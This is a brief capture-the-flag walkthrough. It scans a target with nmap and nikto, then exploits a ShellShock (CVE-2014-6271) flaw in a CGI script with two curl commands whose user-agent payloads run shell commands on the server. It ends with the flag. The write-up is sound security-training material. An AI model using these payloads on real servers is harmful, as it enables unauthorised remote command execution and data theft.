public IP : `18.198.209.0`

ping not working.

`nmap -A -oN nmap 18.198.209.0`:

	PORT     STATE  SERVICE VERSION
	22/tcp   open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	80/tcp   closed http
	443/tcp  closed https
	3333/tcp open   http    Apache httpd 2.2.22 ((Debian))    
	4444/tcp closed krb524
	4446/tcp closed n1-fwp
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

`nikto -h http://18.198.209.0:3333`:

	http://18.198.209.0:3333/cgi-bin/status : ShellShock Vuln (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)

[exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /home'" http://18.198.209.0:3333/cgi-bin/status`

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/inside'" http://18.198.209.0:3333/cgi-bin/status`

**FLAG{InSiDe_ShOcK_WaVe_StAy_HoMe_StAy_SaFe}**



